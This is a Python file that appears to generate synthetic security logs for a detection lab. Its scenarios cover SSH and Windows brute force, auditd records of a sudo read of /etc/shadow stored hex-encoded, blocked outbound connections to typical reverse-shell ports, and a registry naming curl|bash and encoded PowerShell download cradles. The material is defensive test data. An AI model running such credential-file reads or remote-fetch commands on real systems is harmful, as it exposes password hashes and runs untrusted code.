    """auditd: 7 PAM failures from one source, a success, sudo 'cat /etc/shadow' (hex-encoded), useradd -> KB-LNX-021, KB-LNX-020."""
    out = []
    for i in range(7):
        acct = "root" if i < 2 else ctx.user
        out.append(env_auditd(ctx, "USER_AUTH", f"pid={2000 + i} uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication "
                                                f"grantors=? acct=\"{acct}\" exe=\"/usr/sbin/sshd\" hostname={ctx.source_ip} addr={ctx.source_ip} terminal=ssh res=failed'", "auditd"))
    out.append(env_auditd(ctx, "USER_AUTH", f"pid=2020 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=pam_unix "
                                            f"acct=\"{ctx.user}\" exe=\"/usr/sbin/sshd\" hostname={ctx.source_ip} addr={ctx.source_ip} terminal=ssh res=success'", "auditd"))
    out.append(env_auditd(ctx, "USER_LOGIN", f"pid=2020 uid=0 auid=1001 ses=42 subj=unconfined msg='op=login id=1001 exe=\"/usr/sbin/sshd\" "
                                             f"hostname={ctx.source_ip} addr={ctx.source_ip} terminal=/dev/pts/1 res=success'", "auditd"))
    cmd_hex = "cat /etc/shadow".encode().hex().upper()
    out.append(env_auditd(ctx, "USER_CMD", f"pid=2050 uid=1001 auid=1001 ses=42 subj=unconfined msg='cwd=\"/home/{ctx.user}\" cmd={cmd_hex} "
                                           f"exe=\"/usr/bin/sudo\" terminal=pts/1 res=success'", "auditd"))
    out.append(env_auditd(ctx, "EXECVE", 'argc=2 a0="cat" a1="/etc/shadow"', "auditd"))
    out.append(env_auditd(ctx, "ADD_USER", "pid=2062 uid=0 auid=1001 ses=42 subj=unconfined msg='op=adding user id=1002 exe=\"/usr/sbin/useradd\" "
                                           "hostname=? addr=? terminal=pts/1 res=success'", "auditd"))
    return out


def firewall_outbound_burst(ctx: Ctx) -> list[dict]:
    """35 UFW BLOCK lines for outbound connections from one server to many destinations -> KB-NET-005."""
    out = []
    for i in range(35):
        msg = (f"[UFW BLOCK] IN= OUT=eth0 SRC=10.10.30.20 DST=192.0.2.{1 + i} LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID={ctx.rnd.randint(1000, 65000)} DF "
               f"PROTO=TCP SPT={ctx.rnd.randint(40000, 65000)} DPT={[4444, 8080, 1337, 9001, 6667][i % 5]} WINDOW=64240 RES=0x00 SYN URGP=0")
        out.append(env_syslog(ctx, "kernel", msg, "firewall-outbound-burst", dataset="linux.firewall", ts=ctx.tick(1)))
    return out


def dhcp_events(ctx: Ctx) -> list[dict]:
    """Windows DHCP server log: two leases, an IP conflict, a NACK (KB-NET-031) and a lease
    handed out at 22:30 UTC = 02:30 lab time (KB-NET-032).  The night-time record is pinned to a
    fixed hour so the out-of-hours rule fires whatever the wall clock says when the scenario runs."""
    night = (now() - timedelta(days=1)).replace(hour=22, minute=30, second=0, microsecond=0)
    return [env_dhcp(ctx, "10", "Assign", "10.10.20.10", "ws01.lab.local", "00155D010203", "dhcp"),
            env_dhcp(ctx, "11", "Renew", "10.10.20.11", "ws02.lab.local", "00155D010204", "dhcp"),
            env_dhcp(ctx, "13", "Conflict", "10.10.20.10", "", "00155D010203", "dhcp"),
            env_dhcp(ctx, "15", "NACK", "10.10.20.99", "unknown-device", "DEADBEEF0001", "dhcp"),
            env_dhcp(ctx, "10", "Assign", "10.10.20.77", "night-laptop.lab.local", "00155D0199AA", "dhcp", ts=night)]


SCENARIOS: dict[str, tuple[str, Callable[[Ctx], list[dict]]]] = {
    "baseline": ("Benign logons, processes, DNS, ssh, cron and web traffic (no alerts expected)", baseline),
    "windows-brute-force": ("15x 4625 failed logons from one IP, then 4624 success (KB-WIN-001, KB-COR-001)", windows_brute_force),
    "ssh-brute-force": ("sshd failed passwords / invalid users from one IP, then accepted (KB-LNX-001, KB-COR-002)", ssh_brute_force),
    "port-scan": ("40 ports touched on one host by one source: Sysmon 3 + UFW blocks (KB-NET-001, KB-NET-002)", port_scan),
    "lolbin": ("certutil/mshta/rundll32/regsvr32/bitsadmin/wmic/wscript/recon command lines (KB-SYS-010..)", lolbin),
    "encoded-powershell": ("powershell -EncodedCommand + script block download cradle (KB-SYS-020, KB-PS-001)", encoded_powershell),
    "new-admin-user": ("4720 user created + 4732 added to Administrators (KB-WIN-010, KB-WIN-011)", new_admin_user),
    "log-cleared": ("1102 security log cleared (KB-WIN-020)", log_cleared),
    "suspicious-service": ("7045/4697 service installed from Temp (KB-WIN-030)", suspicious_service),
    "scheduled-task": ("4698 scheduled task running hidden powershell (KB-WIN-031)", scheduled_task),
    "suspicious-dns": ("Sysmon 22 queries to suspicious TLDs / listed domains (KB-NET-010, KB-TI-002)", suspicious_dns),
    "intel-hit": ("Connection + DNS to indicators from intel/ lists (KB-TI-001, KB-TI-002)", intel_hit),
    "linux-privilege": ("sudo failures, useradd, usermod sudo, su root, curl|bash (KB-LNX-010..)", linux_privilege),
    "web-scan": ("Nikto-style path probing + wp-login brute force (KB-WEB-001, KB-WEB-002)", web_scan),
    "office-spawn": ("WINWORD spawning cmd/powershell (KB-SYS-030)", office_spawn),
    "credential-access": ("Sysmon 10 lsass access from unusual process (KB-SYS-040)", credential_access),
    # ---- Week 3 team scenarios ----
    "after-hours-logon": ("RDP logon on the DC at 02:30 lab time (KB-WIN-007)", after_hours_logon),
    "multi-host-logon": ("one account logging on to 5 hosts in a minute (KB-WIN-008)", multi_host_logon),
    "rdp-then-service": ("RDP session then a new service from Temp on the same host (KB-COR-006, KB-WIN-030)", rdp_then_service),
    "download-then-execute": ("exe written to Downloads then executed (KB-COR-007, KB-SYS-050)", download_then_execute),
    "dns-beacon": ("70 DNS queries to sub-domains of one domain from a user-dir binary (KB-NET-014, KB-NET-011)", dns_beacon),
    "defender-exclusion": ("Sysmon 13 Defender exclusion path added (KB-SYS-072)", defender_exclusion),
    "web-errors": ("25 HTTP 5xx in a minute + nginx error-log sensitive-file probes (KB-WEB-006, KB-WEB-007)", web_errors),
    "fail2ban": ("fail2ban Found x5 then Ban of a lab address (KB-NET-030, KB-NET-033)", fail2ban_ban),
    "auditd": ("auditd PAM failure burst, sudo cat /etc/shadow, useradd (KB-LNX-021, KB-LNX-020)", auditd_records),
    "firewall-outbound-burst": ("35 blocked outbound connections from one server (KB-NET-005)", firewall_outbound_burst),
    "dhcp": ("Windows DHCP log: leases, IP conflict, NACK, night-time lease (KB-NET-031, KB-NET-032)", dhcp_events),
}


def _run_scenarios(names: list[str], ctx: Ctx) -> list[dict]:
    out: list[dict] = []
    for name in names:
        if name not in SCENARIOS:
            raise KeyError(f"unknown scenario {name!r}; choose from: {', '.join(SCENARIOS)}")
        out.extend(SCENARIOS[name][1](ctx))
        ctx.tick(3)
    return out


def generate(names: list[str], **ctx_kwargs) -> list[dict]:
    """Generate envelopes for the named scenarios.

    Unless ``start`` is given, the timeline is aligned so that the *last* event
    is stamped a few seconds before "now": dashboards with a ``to=now`` range
    then show everything, while the per-event spacing is preserved.
    """
    if "all" in names:
        names = list(SCENARIOS)
    if ctx_kwargs.get("start") is None:
        probe_start = now()
        probe = Ctx(**{**ctx_kwargs, "start": probe_start})
        _run_scenarios(names, probe)
        span = probe._t - probe_start
        ctx_kwargs["start"] = now() - span - timedelta(seconds=5)
    return _run_scenarios(names, Ctx(**ctx_kwargs))


from . import coverage_pack  # noqa: E402,F401  - registers the extra scenarios into SCENARIOS
